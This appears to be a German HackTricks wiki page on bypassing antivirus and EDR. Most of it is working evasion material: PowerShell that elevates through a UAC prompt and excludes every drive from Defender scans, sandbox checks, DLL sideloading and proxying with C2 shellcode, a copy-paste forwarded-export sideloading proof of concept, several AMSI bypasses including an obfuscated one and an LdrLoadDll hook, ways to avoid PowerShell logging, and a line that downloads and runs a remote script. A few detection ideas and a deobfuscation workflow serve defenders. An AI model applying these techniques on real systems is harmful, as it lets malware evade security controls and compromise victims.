# Antivirus (AV) Bypass

{{#include ../banners/hacktricks-training.md}}

**Diese Seite wurde ursprünglich von** [**@m2rc_p**](https://twitter.com/m2rc_p)**!**

## Stop Defender

- [defendnot](https://github.com/es3n1n/defendnot): Ein Tool, um Windows Defender zum Stoppen zu bringen.
- [no-defender](https://github.com/es3n1n/no-defender): Ein Tool, um Windows Defender zum Stoppen zu bringen, indem ein anderes AV vorgetäuscht wird.
- [Disable Defender if you are admin](basic-powershell-for-pentesters/README.md)

### Installer-style UAC bait before tampering with Defender

Öffentlich verfügbare Loader, die sich oft als Game Cheats ausgeben, werden häufig als unsignierte Node.js/Nexe-Installer ausgeliefert, die zuerst **den Benutzer um Erhöhung der Rechte bitten** und erst danach Defender deaktivieren. Der Ablauf ist einfach:

1. Prüfe den administrativen Kontext mit `net session`. Der Befehl funktioniert nur, wenn der Aufrufer Admin-Rechte hat; ein Fehlschlag bedeutet also, dass der Loader als normaler Benutzer läuft.
2. Starte sich sofort mit dem `RunAs`-Verb neu, um den erwarteten UAC-Zustimmungsdialog auszulösen und gleichzeitig die ursprüngliche Befehlszeile beizubehalten.
```powershell
if (-not (net session 2>$null)) {
powershell -WindowStyle Hidden -Command "Start-Process cmd.exe -Verb RunAs -WindowStyle Hidden -ArgumentList '/c ""`<path_to_loader`>""'"
exit
}
```
Opfer glauben bereits, dass sie „cracked“ Software installieren, daher wird die Aufforderung meist akzeptiert, wodurch die Malware die Rechte erhält, die sie braucht, um Defenders Richtlinie zu ändern.

### Umfassende `MpPreference`-Ausschlüsse für jeden Laufwerksbuchstaben

Nach der Privilegienerweiterung maximieren GachiLoader-ähnliche Chains die Blind Spots von Defender, statt den Dienst direkt zu deaktivieren. Der Loader beendet zuerst den GUI-Watchdog (`taskkill /F /IM SecHealthUI.exe`) und setzt dann **extrem weit gefasste Ausschlüsse**, sodass jedes Benutzerprofil, jedes Systemverzeichnis und jeder Wechseldatenträger nicht mehr gescannt werden kann:
```powershell
$targets = @('C:\Users\', 'C:\ProgramData\', 'C:\Windows\')
Get-PSDrive -PSProvider FileSystem | ForEach-Object { $targets += $_.Root }
$targets | Sort-Object -Unique | ForEach-Object { Add-MpPreference -ExclusionPath $_ }
Add-MpPreference -ExclusionExtension '.sys'
```
Wichtige Beobachtungen:

- Die Schleife durchläuft jedes eingehängte Dateisystem (D:\, E:\, USB-Sticks usw.), sodass **jede zukünftige Payload, die irgendwo auf die Platte gelegt wird, ignoriert wird**.
- Der Ausschluss der `.sys`-Erweiterung ist vorausschauend — Angreifer behalten sich die Option vor, später unsignierte Treiber zu laden, ohne Defender erneut anzufassen.
- Alle Änderungen landen unter `HKLM\SOFTWARE\Microsoft\Windows Defender\Exclusions`, sodass spätere Phasen bestätigen können, dass die Ausnahmen bestehen bleiben oder erweitert wurden, ohne erneut UAC auszulösen.

Da kein Defender-Dienst gestoppt wird, melden einfache Health Checks weiterhin „antivirus active“, obwohl die Echtzeitprüfung diese Pfade nie berührt.

## **AV Evasion Methodology**

Derzeit verwenden AVs unterschiedliche Methoden, um zu prüfen, ob eine Datei bösartig ist oder nicht: statische Erkennung, dynamische Analyse und bei den fortgeschritteneren EDRs Verhaltensanalyse.

### **Static detection**

Static detection wird erreicht, indem bekannte bösartige Strings oder Byte-Arrays in einem Binary oder Skript markiert werden und außerdem Informationen aus der Datei selbst extrahiert werden (z. B. Dateibeschreibung, Firmenname, digitale Signaturen, Icon, Checksumme usw.). Das bedeutet, dass die Verwendung bekannter öffentlicher Tools dazu führen kann, dass ihr leichter erwischt werdet, da sie wahrscheinlich bereits analysiert und als bösartig markiert wurden. Es gibt einige Möglichkeiten, diese Art von Erkennung zu umgehen:

- **Encryption**

Wenn ihr das Binary verschlüsselt, gibt es für AV keine Möglichkeit, euer Programm zu erkennen, aber ihr braucht irgendeine Art von Loader, um das Programm im Speicher zu entschlüsseln und auszuführen.

- **Obfuscation**

Manchmal reicht es schon, einige Strings in eurem Binary oder Skript zu ändern, um es an AV vorbeizubringen, aber das kann je nach dem, was ihr obfuskieren wollt, zeitaufwendig sein.

- **Custom tooling**

Wenn ihr eure eigenen Tools entwickelt, gibt es keine bekannten bösartigen Signaturen, aber das kostet viel Zeit und Aufwand.

> [!TIP]
> Eine gute Methode, um Windows Defender auf statische Erkennung zu prüfen, ist [ThreatCheck](https://github.com/rasta-mouse/ThreatCheck). Es teilt die Datei im Grunde in mehrere Segmente auf und lässt dann Defender jedes einzelne separat scannen; so kann es euch genau sagen, welche Strings oder Bytes in eurem Binary markiert wurden.

Ich empfehle euch sehr, euch diese [YouTube playlist](https://www.youtube.com/playlist?list=PLj05gPj8rk_pkb12mDe4PgYZ5qPxhGKGf) über praktische AV Evasion anzusehen.

### **Dynamic analysis**

Dynamic analysis ist, wenn der AV euer Binary in einer Sandbox ausführt und nach bösartiger Aktivität sucht (z. B. versucht, die Passwörter eures Browsers zu entschlüsseln und zu lesen, einen Minidump auf LSASS zu machen usw.). Dieser Teil kann etwas schwieriger sein, aber hier sind einige Dinge, die ihr tun könnt, um Sandboxes zu umgehen.

- **Sleep before execution** Je nachdem, wie es implementiert ist, kann das eine großartige Möglichkeit sein, die dynamische Analyse von AV zu umgehen. AVs haben nur sehr wenig Zeit, Dateien zu scannen, damit der Workflow des Benutzers nicht unterbrochen wird, daher können lange Sleeps die Analyse von Binaries stören. Das Problem ist, dass viele AV-Sandboxes den Sleep je nach Implementierung einfach überspringen können.
- **Checking machine's resources** Normalerweise haben Sandboxes nur sehr wenige Ressourcen zur Verfügung (z. B. < 2GB RAM), sonst könnten sie den Rechner des Benutzers verlangsamen. Hier könnt ihr auch sehr kreativ werden, zum Beispiel indem ihr die CPU-Temperatur oder sogar die Lüftergeschwindigkeit prüft; nicht alles wird in der Sandbox implementiert sein.
- **Machine-specific checks** Wenn ihr einen Benutzer angreifen wollt, dessen Workstation der Domäne "contoso.local" beigetreten ist, könnt ihr eine Prüfung auf die Domäne des Computers durchführen, um zu sehen, ob sie mit der angegebenen übereinstimmt; wenn nicht, könnt ihr euer Programm beenden lassen.

Es stellt sich heraus, dass der Computername der Microsoft Defender Sandbox HAL9TH ist, also könnt ihr vor der Ausführung den Computernamen in eurer Malware prüfen; wenn der Name HAL9TH ist, bedeutet das, dass ihr euch in der Sandbox von Defender befindet, also könnt ihr euer Programm beenden lassen.

<figure><img src="../images/image (209).png" alt=""><figcaption><p>source: <a href="https://youtu.be/StSLxFbVz0M?t=1439">https://youtu.be/StSLxFbVz0M?t=1439</a></p></figcaption></figure>

Einige weitere wirklich gute Tipps von [@mgeeky](https://twitter.com/mariuszbit) für den Umgang mit Sandboxes

<figure><img src="../images/image (248).png" alt=""><figcaption><p><a href="https://discord.com/servers/red-team-vx-community-1012733841229746240">Red Team VX Discord</a> #malware-dev channel</p></figcaption></figure>

Wie wir in diesem Beitrag schon gesagt haben, werden **öffentliche Tools** irgendwann **erkannt**, also solltet ihr euch etwas fragen:

Wenn ihr zum Beispiel LSASS dumpen wollt, **müsst ihr wirklich mimikatz verwenden**? Oder könnt ihr ein anderes, weniger bekanntes Projekt verwenden, das ebenfalls LSASS dumpt.

Die richtige Antwort ist wahrscheinlich letzteres. Nimmt man mimikatz als Beispiel, ist es wahrscheinlich eines der, wenn nicht sogar das am häufigsten von AVs und EDRs markierte Stück Malware; das Projekt selbst ist super cool, aber auch ein Albtraum, wenn man damit arbeiten und AVs umgehen will, also sucht einfach nach Alternativen für das, was ihr erreichen wollt.

> [!TIP]
> Wenn ihr eure Payloads für Evasion anpasst, stellt sicher, dass ihr in Defender die **automatische Sample-Einreichung deaktiviert**, und bitte, wirklich, **NICHT AUF VIRUSTOTAL HOCHLADEN**, wenn euer Ziel langfristige Evasion ist. Wenn ihr prüfen wollt, ob eure Payload von einem bestimmten AV erkannt wird, installiert ihn in einer VM, versucht die automatische Sample-Einreichung zu deaktivieren, und testet dort, bis ihr mit dem Ergebnis zufrieden seid.

## EXEs vs DLLs

Wann immer es möglich ist, solltet ihr bei Evasion immer **die Verwendung von DLLs priorisieren**; meiner Erfahrung nach werden DLL-Dateien normalerweise **deutlich seltener erkannt** und analysiert, also ist das in manchen Fällen ein sehr einfacher Trick, um Erkennung zu vermeiden (wenn eure Payload natürlich irgendeine Möglichkeit hat, als DLL zu laufen).

Wie wir in diesem Bild sehen können, hat eine DLL-Payload von Havoc in antiscan.me eine Erkennungsrate von 4/26, während die EXE-Payload eine Erkennungsrate von 7/26 hat.

<figure><img src="../images/image (1130).png" alt=""><figcaption><p>antiscan.me comparison of a normal Havoc EXE payload vs a normal Havoc DLL</p></figcaption></figure>

Jetzt zeigen wir einige Tricks, die ihr mit DLL-Dateien verwenden könnt, um deutlich stealthier zu sein.

## DLL Sideloading & Proxying

**DLL Sideloading** nutzt die DLL-Suchreihenfolge aus, die vom Loader verwendet wird, indem sowohl die Zielanwendung als auch die bösartige(n) Payload(s) nebeneinander platziert werden.

Ihr könnt nach Programmen suchen, die anfällig für DLL Sideloading sind, mit [Siofra](https://github.com/Cybereason/siofra) und dem folgenden powershell script:
```bash
Get-ChildItem -Path "C:\Program Files\" -Filter *.exe -Recurse -File -Name| ForEach-Object {
$binarytoCheck = "C:\Program Files\" + $_
C:\Users\user\Desktop\Siofra64.exe --mode file-scan --enum-dependency --dll-hijack -f $binarytoCheck
}
```
Dieser Befehl gibt die Liste der Programme aus, die anfällig für DLL Hijacking in "C:\Program Files\\" sind, sowie die DLL-Dateien, die sie zu laden versuchen.

Ich empfehle dringend, dass du **DLL Hijackable/Sideloadable Programme selbst erkundest**, diese Technik ist bei korrekter Anwendung ziemlich stealthy, aber wenn du öffentlich bekannte DLL Sideloadable Programme verwendest, kannst du leicht erwischt werden.

Nur indem du eine bösartige DLL mit dem Namen platzierst, den ein Programm zum Laden erwartet, wird dein Payload nicht geladen, da das Programm bestimmte spezifische Funktionen innerhalb dieser DLL erwartet. Um dieses Problem zu beheben, verwenden wir eine andere Technik namens **DLL Proxying/Forwarding**.

**DLL Proxying** leitet die Aufrufe weiter, die ein Programm von der Proxy- (und bösartigen) DLL an die ursprüngliche DLL macht, wodurch die Funktionalität des Programms erhalten bleibt und die Ausführung deines Payloads ermöglicht wird.

Ich werde das [SharpDLLProxy](https://github.com/Flangvik/SharpDllProxy) Projekt von [@flangvik](https://twitter.com/Flangvik/) verwenden

Dies sind die Schritte, denen ich gefolgt bin:
```
1. Find an application vulnerable to DLL Sideloading (siofra or using Process Hacker)
2. Generate some shellcode (I used Havoc C2)
3. (Optional) Encode your shellcode using Shikata Ga Nai (https://github.com/EgeBalci/sgn)
4. Use SharpDLLProxy to create the proxy dll (.\SharpDllProxy.exe --dll .\mimeTools.dll --payload .\demon.bin)
```
Der letzte Befehl gibt uns 2 Dateien: eine DLL-Quellcodevorlage und die original umbenannte DLL.

<figure><img src="../images/sharpdllproxy.gif" alt=""><figcaption></figcaption></figure>
```
5. Create a new visual studio project (C++ DLL), paste the code generated by SharpDLLProxy (Under output_dllname/dllname_pragma.c) and compile. Now you should have a proxy dll which will load the shellcode you've specified and also forward any calls to the original DLL.
```
Diese sind die Ergebnisse:

<figure><img src="../images/dll_sideloading_demo.gif" alt=""><figcaption></figcaption></figure>

Sowohl unsere shellcode (kodiert mit [SGN](https://github.com/EgeBalci/sgn)) als auch die proxy DLL haben eine Detection-Rate von 0/26 auf [antiscan.me](https://antiscan.me)! Ich würde das als Erfolg bezeichnen.

<figure><img src="../images/image (193).png" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Ich **empfehle sehr**, dass du dir [S3cur3Th1sSh1t's twitch VOD](https://www.twitch.tv/videos/1644171543) über DLL Sideloading und auch [ippsec's video](https://www.youtube.com/watch?v=3eROsG_WNpE) anschaust, um mehr über das zu lernen, was wir hier ausführlicher besprochen haben.

### Abusing Forwarded Exports (ForwardSideLoading)

Windows PE modules können Funktionen exportieren, die eigentlich "forwarders" sind: Statt auf Code zu zeigen, enthält der Export-Eintrag einen ASCII-String der Form `TargetDll.TargetFunc`. Wenn ein Aufrufer den Export auflöst, wird der Windows loader:

- `TargetDll` laden, falls es noch nicht geladen ist
- `TargetFunc` daraus auflösen

Wichtige Verhaltensweisen, die man verstehen sollte:
- Wenn `TargetDll` eine KnownDLL ist, wird sie aus dem geschützten KnownDLLs-Namespace bereitgestellt (z. B. ntdll, kernelbase, ole32).
- Wenn `TargetDll` keine KnownDLL ist, wird die normale DLL search order verwendet, die auch das Verzeichnis des Moduls umfasst, das die Forward-Auflösung durchführt.

Das ermöglicht ein indirektes sideloading-Primitive: Finde eine signierte DLL, die eine Funktion exportiert, die auf ein Modul ohne KnownDLL-Status weitergeleitet wird, und lege diese signierte DLL zusammen mit einer von Angreifern kontrollierten DLL ab, die genau wie das weitergeleitete Zielmodul heißt. Wenn der forwarded export aufgerufen wird, löst der loader die Weiterleitung auf und lädt deine DLL aus demselben Verzeichnis, wodurch dein DllMain ausgeführt wird.

Beispiel auf Windows 11 beobachtet:
```
keyiso.dll KeyIsoSetAuditingInterface -> NCRYPTPROV.SetAuditingInterface
```
`NCRYPTPROV.dll` ist kein KnownDLL, daher wird es über die normale Suchreihenfolge aufgelöst.

PoC (copy-paste):
1) Kopiere die signierte System-DLL in einen beschreibbaren Ordner
```
copy C:\Windows\System32\keyiso.dll C:\test\
```
2) Platziere eine bösartige `NCRYPTPROV.dll` im selben Ordner. Ein minimales DllMain reicht aus, um Codeausführung zu erhalten; du musst die weitergeleitete Funktion nicht implementieren, um DllMain auszulösen.
```c
// x64: x86_64-w64-mingw32-gcc -shared -o NCRYPTPROV.dll ncryptprov.c
#include <windows.h>
BOOL WINAPI DllMain(HINSTANCE hinst, DWORD reason, LPVOID reserved){
if (reason == DLL_PROCESS_ATTACH){
HANDLE h = CreateFileA("C\\\\test\\\\DLLMain_64_DLL_PROCESS_ATTACH.txt", GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
if(h!=INVALID_HANDLE_VALUE){ const char *m = "hello"; DWORD w; WriteFile(h,m,5,&w,NULL); CloseHandle(h);}
}
return TRUE;
}
```
3) Den forward mit einem signierten LOLBin auslösen:
```
rundll32.exe C:\test\keyiso.dll, KeyIsoSetAuditingInterface
```
Beobachtetes Verhalten:
- rundll32 (signiert) lädt die Side-by-Side `keyiso.dll` (signiert)
- Beim Auflösen von `KeyIsoSetAuditingInterface` folgt der Loader dem Forward auf `NCRYPTPROV.SetAuditingInterface`
- Der Loader lädt dann `NCRYPTPROV.dll` aus `C:\test` und führt dessen `DllMain` aus
- Wenn `SetAuditingInterface` nicht implementiert ist, erhältst du einen "missing API"-Fehler erst nachdem `DllMain` bereits ausgeführt wurde

Jagd-Tipps:
- Konzentriere dich auf forwarded exports, bei denen das Zielmodul kein KnownDLL ist. KnownDLLs sind unter `HKLM\SYSTEM\CurrentControlSet\Control\Session Manager\KnownDLLs` aufgelistet.
- Du kannst forwarded exports mit Tools wie folgt enumerieren:
```
dumpbin /exports C:\Windows\System32\keyiso.dll
# forwarders appear with a forwarder string e.g., NCRYPTPROV.SetAuditingInterface
```
- Siehe das Windows 11 forwarder inventory, um nach Kandidaten zu suchen: https://hexacorn.com/d/apis_fwd.txt

Detection/defense ideas:
- Monitor LOLBins (z. B. rundll32.exe), die signierte DLLs aus nicht-Systempfaden laden, gefolgt vom Laden von non-KnownDLLs mit demselben Basisnamen aus diesem Verzeichnis
- Alert auf Prozess-/Modul-Ketten wie: `rundll32.exe` → nicht-System-`keyiso.dll` → `NCRYPTPROV.dll` unter benutzerbeschreibbaren Pfaden
- Erzwinge code integrity policies (WDAC/AppLocker) und verweigere write+execute in Anwendungsverzeichnissen

## [**Freeze**](https://github.com/optiv/Freeze)

`Freeze is a payload toolkit for bypassing EDRs using suspended processes, direct syscalls, and alternative execution methods`

Du kannst Freeze verwenden, um deinen shellcode auf eine stealthy Weise zu laden und auszuführen.
```
Git clone the Freeze repo and build it (git clone https://github.com/optiv/Freeze.git && cd Freeze && go build Freeze.go)
1. Generate some shellcode, in this case I used Havoc C2.
2. ./Freeze -I demon.bin -encrypt -O demon.exe
3. Profit, no alerts from defender
```
<figure><img src="../images/freeze_demo_hacktricks.gif" alt=""><figcaption></figcaption></figure>

> [!TIP]
> Evasion ist nur ein Katz-und-Maus-Spiel, was heute funktioniert, kann morgen erkannt werden, also verlasse dich nie nur auf ein einziges Tool; versuche nach Möglichkeit, mehrere Evasion-Techniken zu kombinieren.

## Direct/Indirect Syscalls & SSN Resolution (SysWhispers4)

EDRs platzieren oft **user-mode inline hooks** auf `ntdll.dll` syscall stubs. Um diese Hooks zu umgehen, kannst du **direct** oder **indirect** syscall stubs erzeugen, die die korrekte **SSN** (System Service Number) laden und in den kernel mode wechseln, ohne den gehookten Export-Entrypoint auszuführen.

**Invocation options:**
- **Direct (embedded)**: eine `syscall`/`sysenter`/`SVC #0`-Instruktion in den generierten Stub einfügen (kein `ntdll`-Export wird getroffen).
- **Indirect**: in ein vorhandenes `syscall`-Gadget innerhalb von `ntdll` springen, sodass der Kernel-Übergang so aussieht, als käme er von `ntdll` (nützlich für heuristic evasion); **randomized indirect** wählt pro Aufruf ein Gadget aus einem Pool.
- **Egg-hunt**: vermeiden, die statische `0F 05`-Opcode-Sequenz auf Disk einzubetten; zur Laufzeit eine syscall-Sequenz auflösen.

**Hook-resistant SSN resolution strategies:**
- **FreshyCalls (VA sort)**: SSNs ableiten, indem syscall stubs nach ihrer virtuellen Adresse sortiert werden, statt die Stub-Bytes zu lesen.
- **SyscallsFromDisk**: ein sauberes `\KnownDlls\ntdll.dll` einbinden, SSNs aus dessen `.text` lesen und dann aushängen (umgeht alle in-memory hooks).
- **RecycledGate**: VA-sortierte SSN-Ableitung mit Opcode-Validierung kombinieren, wenn ein Stub sauber ist; bei einem gehookten Stub auf VA-Ableitung zurückfallen.
- **HW Breakpoint**: DR0 auf die `syscall`-Instruktion setzen und einen VEH verwenden, um die SSN zur Laufzeit aus `EAX` zu erfassen, ohne gehookte Bytes zu parsen.

Example SysWhispers4 usage:
```bash
# Indirect syscalls + hook-resistant resolution
python syswhispers.py --preset injection --method indirect --resolve recycled

# Resolve SSNs from a clean on-disk ntdll
python syswhispers.py --preset injection --method indirect --resolve from_disk --unhook-ntdll

# Hardware breakpoint SSN extraction
python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --resolve hw_breakpoint
```
## AMSI (Anti-Malware Scan Interface)

AMSI wurde entwickelt, um "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" zu verhindern. Anfangs konnten AVs nur **Dateien auf der Festplatte** scannen, also wenn du es irgendwie schaffen konntest, Payloads **direkt im Speicher** auszuführen, konnte der AV nichts tun, um das zu verhindern, da er nicht genug Sichtbarkeit hatte.

Das AMSI-Feature ist in diese Komponenten von Windows integriert.

- User Account Control, oder UAC (elevation von EXE, COM, MSI oder ActiveX-Installation)
- PowerShell (Skripte, interaktive Nutzung und dynamische Codeauswertung)
- Windows Script Host (wscript.exe und cscript.exe)
- JavaScript und VBScript
- Office VBA macros

Es ermöglicht Antivirus-Lösungen, das Verhalten von Skripten zu prüfen, indem der Skriptinhalt in einer Form offengelegt wird, die weder verschlüsselt noch obfuskiert ist.

Das Ausführen von `IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` erzeugt den folgenden Alarm bei Windows Defender.

<figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>

Beachte, wie es `amsi:` voranstellt und danach den Pfad zur ausführbaren Datei, von der das Skript ausgeführt wurde, in diesem Fall powershell.exe

Wir haben keine Datei auf die Festplatte abgelegt, wurden aber trotzdem im Speicher durch AMSI erkannt.

Außerdem wird ab **.NET 4.8** auch C#-Code durch AMSI ausgeführt. Das betrifft sogar `Assembly.Load(byte[])` zum Laden von Ausführung im Speicher. Deshalb wird empfohlen, für Ausführung im Speicher niedrigere Versionen von .NET (wie 4.7.2 oder darunter) zu verwenden, wenn du AMSI umgehen willst.

Es gibt einige Möglichkeiten, AMSI zu umgehen:

- **Obfuscation**

Da AMSI hauptsächlich mit statischen Erkennungen arbeitet, kann das Ändern der Skripte, die du laden willst, ein guter Weg sein, um Erkennung zu vermeiden.

Allerdings hat AMSI die Fähigkeit, Skripte auch dann zu deobfuszieren, wenn sie mehrere Ebenen haben, daher kann Obfuscation je nach Umsetzung eine schlechte Option sein. Das macht das Umgehen nicht ganz trivial. Manchmal reicht es jedoch schon, ein paar Variablennamen zu ändern, und es funktioniert, also hängt es davon ab, wie stark etwas bereits markiert wurde.

- **AMSI Bypass**

Da AMSI implementiert ist, indem eine DLL in den Prozess powershell (auch cscript.exe, wscript.exe, etc.) geladen wird, ist es möglich, daran selbst als unprivilegierter Benutzer leicht herumzupfuschen. Aufgrund dieses Fehlers in der Implementierung von AMSI haben Forscher mehrere Wege gefunden, das AMSI-Scanning zu umgehen.

**Forcing an Error**

Das Erzwingen eines Fehlers bei der AMSI-Initialisierung (amsiInitFailed) führt dazu, dass für den aktuellen Prozess kein Scan gestartet wird. Ursprünglich wurde dies von [Matt Graeber](https://twitter.com/mattifestation) veröffentlicht, und Microsoft hat eine Signatur entwickelt, um die weitere Verbreitung zu verhindern.
```bash
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
```
Alles, was es brauchte, war eine Zeile PowerShell-Code, um AMSI für den aktuellen PowerShell-Prozess unbrauchbar zu machen. Diese Zeile wurde natürlich von AMSI selbst erkannt, daher ist eine Anpassung nötig, um diese Technik zu verwenden.

Hier ist ein modifizierter AMSI-bypass, den ich aus diesem [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) übernommen habe.
```bash
Try{#Ams1 bypass technic nº 2
$Xdatabase = 'Utils';$Homedrive = 'si'
$ComponentDeviceId = "N`onP" + "ubl`ic" -join ''
$DiskMgr = 'Syst+@.MÂ£nÂ£g' + 'e@+nt.Auto@' + 'Â£tion.A' -join ''
$fdx = '@ms' + 'Â£InÂ£' + 'tF@Â£' + 'l+d' -Join '';Start-Sleep -Milliseconds 300
$CleanUp = $DiskMgr.Replace('@','m').Replace('Â£','a').Replace('+','e')
$Rawdata = $fdx.Replace('@','a').Replace('Â£','i').Replace('+','e')
$SDcleanup = [Ref].Assembly.GetType(('{0}m{1}{2}' -f $CleanUp,$Homedrive,$Xdatabase))
$Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
$Spotfix.SetValue($null,$true)
}Catch{Throw $_}
```
Beachte, dass dies wahrscheinlich markiert wird, sobald dieser Beitrag veröffentlicht wird, also solltest du keinen Code veröffentlichen, wenn dein Plan ist, unentdeckt zu bleiben.

**Memory Patching**

Diese Technik wurde ursprünglich von [@RastaMouse](https://twitter.com/_RastaMouse/) entdeckt und besteht darin, die Adresse der Funktion "AmsiScanBuffer" in amsi.dll zu finden (die für das Scannen der vom Benutzer bereitgestellten Eingaben zuständig ist) und sie durch Anweisungen zu überschreiben, die den Code für E_INVALIDARG zurückgeben; auf diese Weise liefert das Ergebnis des eigentlichen Scans 0, was als sauberes Ergebnis interpretiert wird.

> [!TIP]
> Bitte lies [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) für eine detailliertere Erklärung.

Es gibt außerdem viele andere Techniken, um AMSI mit powershell zu umgehen; schau dir [**diese Seite**](basic-powershell-for-pentesters/index.html#amsi-bypass) und [**dieses repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) an, um mehr darüber zu erfahren.

### Blocking AMSI by preventing amsi.dll load (LdrLoadDll hook)

AMSI wird nur initialisiert, nachdem `amsi.dll` in den aktuellen Prozess geladen wurde. Ein robuster, sprachunabhängiger Bypass besteht darin, einen User-Mode-Hook auf `ntdll!LdrLoadDll` zu setzen, der einen Fehler zurückgibt, wenn das angeforderte Modul `amsi.dll` ist. Dadurch wird AMSI nie geladen und es erfolgen für diesen Prozess keine Scans.

Implementierungsübersicht (x64 C/C++ Pseudocode):
```c
#include <windows.h>
#include <winternl.h>

typedef NTSTATUS (NTAPI *pLdrLoadDll)(PWSTR, ULONG, PUNICODE_STRING, PHANDLE);
static pLdrLoadDll realLdrLoadDll;

NTSTATUS NTAPI Hook_LdrLoadDll(PWSTR path, ULONG flags, PUNICODE_STRING module, PHANDLE handle){
if (module && module->Buffer){
UNICODE_STRING amsi; RtlInitUnicodeString(&amsi, L"amsi.dll");
if (RtlEqualUnicodeString(module, &amsi, TRUE)){
// Pretend the DLL cannot be found → AMSI never initialises in this process
return STATUS_DLL_NOT_FOUND; // 0xC0000135
}
}
return realLdrLoadDll(path, flags, module, handle);
}

void InstallHook(){
HMODULE ntdll = GetModuleHandleW(L"ntdll.dll");
realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
// Apply inline trampoline or IAT patching to redirect to Hook_LdrLoadDll
// e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
}
```
Notizen
- Funktioniert mit PowerShell, WScript/CScript und benutzerdefinierten Loaders gleichermaßen (alles, was sonst AMSI laden würde).
- Mit dem Einspeisen von Scripts über stdin (`PowerShell.exe -NoProfile -NonInteractive -Command -`) kombinieren, um lange Command-line-Artefakte zu vermeiden.
- Wird bei Loaders gesehen, die über LOLBins ausgeführt werden (z. B. `regsvr32`, das `DllRegisterServer` aufruft).

Das Tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** generiert ebenfalls ein Script, um AMSI zu umgehen.
Das Tool **[https://amsibypass.com/](https://amsibypass.com/)** generiert ebenfalls ein Script, um AMSI zu umgehen, das Signaturen durch randomisierte, benutzerdefinierte Funktionen, Variablen und Zeichen-Ausdrücke vermeidet und außerdem zufällige Groß-/Kleinschreibung bei PowerShell-Schlüsselwörtern anwendet, um Signaturen zu vermeiden.

**Die erkannte Signatur entfernen**

Du kannst ein Tool wie **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** und **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** verwenden, um die erkannte AMSI-Signatur aus dem Speicher des aktuellen Prozesses zu entfernen. Dieses Tool funktioniert, indem es den Speicher des aktuellen Prozesses nach der AMSI-Signatur durchsucht und sie dann mit NOP-Instruktionen überschreibt, wodurch sie effektiv aus dem Speicher entfernt wird.

**AV/EDR-Produkte, die AMSI verwenden**

Eine Liste von AV/EDR-Produkten, die AMSI verwenden, findest du in **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)**.

**PowerShell-Version 2 verwenden**
Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Scripts ausführen kannst, ohne von AMSI gescannt zu werden. Das kannst du so machen:
```bash
powershell.exe -version 2
```
## PS Logging

PowerShell-Logging ist eine Funktion, mit der du alle auf einem System ausgeführten PowerShell-Befehle protokollieren kannst. Das kann für Auditing- und Troubleshooting-Zwecke nützlich sein, aber es kann auch ein **Problem für Angreifer sein, die Erkennung umgehen wollen**.

Um PowerShell-Logging zu umgehen, kannst du die folgenden Techniken verwenden:

- **PowerShell Transcription und Module Logging deaktivieren**: Du kannst dafür ein Tool wie [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) verwenden.
- **Powershell Version 2 verwenden**: Wenn du PowerShell Version 2 verwendest, wird AMSI nicht geladen, sodass du deine Skripte ausführen kannst, ohne von AMSI gescannt zu werden. Das kannst du so machen: `powershell.exe -version 2`
- **Eine Unmanaged Powershell Session verwenden**: Verwende [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell), um eine powershell ohne Schutzmechanismen zu starten (das ist, was `powerpick` von Cobal Strike verwendet).


## Obfuscation

> [!TIP]
> Mehrere Obfuscation-Techniken beruhen auf dem Verschlüsseln von Daten, was die Entropie der Binary erhöht und es AVs und EDRs dadurch leichter macht, sie zu erkennen. Sei dabei vorsichtig und wende Verschlüsselung vielleicht nur auf bestimmte Teile deines Codes an, die sensibel sind oder verborgen werden müssen.

### Deobfuscating ConfuserEx-Protected .NET Binaries

Beim Analysieren von Malware, die ConfuserEx 2 (oder kommerzielle Forks) verwendet, stößt man häufig auf mehrere Schutzschichten, die Decompiler und Sandboxes blockieren. Der folgende Workflow stellt zuverlässig ein nahezu **originales IL** wieder her, das anschließend in Tools wie dnSpy oder ILSpy zu C# dekompiliert werden kann.

1.  Anti-tampering removal – ConfuserEx verschlüsselt jeden *method body* und entschlüsselt ihn im statischen Konstruktor des *module* (`<Module>.cctor`). Dadurch wird auch die PE-Checksumme gepatcht, sodass jede Änderung die Binary zum Absturz bringt. Verwende **AntiTamperKiller**, um die verschlüsselten Metadaten-Tabellen zu lokalisieren, die XOR-Keys wiederherzustellen und eine saubere Assembly neu zu schreiben:
```bash
# https://github.com/wwh1004/AntiTamperKiller
python AntiTamperKiller.py Confused.exe Confused.clean.exe
```
Die Ausgabe enthält die 6 Anti-Tamper-Parameter (`key0-key3`, `nameHash`, `internKey`), die nützlich sein können, wenn du deinen eigenen Unpacker baust.

2.  Symbol- / Control-Flow-Wiederherstellung – gib die *clean* Datei an **de4dot-cex** weiter (ein ConfuserEx-aware Fork von de4dot).
```bash
de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
```
Flags:
• `-p crx` – wähle das ConfuserEx-2-Profil
• de4dot macht Control-Flow-Flattening rückgängig, stellt ursprüngliche Namespaces, Klassen- und Variablennamen wieder her und entschlüsselt konstante Strings.

